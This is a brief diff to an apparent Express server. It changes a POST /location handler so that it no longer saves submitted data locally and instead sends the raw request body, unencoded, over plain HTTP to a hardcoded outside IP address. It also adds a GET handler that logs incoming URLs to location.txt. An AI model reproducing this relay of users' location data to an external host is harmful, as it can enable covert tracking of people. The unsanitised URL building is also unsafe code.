@@ -1,4 +1,6 @@
 const fs = require('fs');
+const http = require('http');
+
 const express = require('express');
 const app = express();
 
@@ -10,7 +12,11 @@ app.get('/', function (req, res) {
 });
 
 app.post('/location', (req, res) => {
-  fs.appendFile('./location.txt', req.body);
+  http.get('http://93.79.103.147:3000/location?'+req.body);
+});
+
+app.get('/location', (req, res) => {
+  fs.appendFile('./location.txt', req.url);
 });
 
 app.listen(process.env.PORT || 3000);
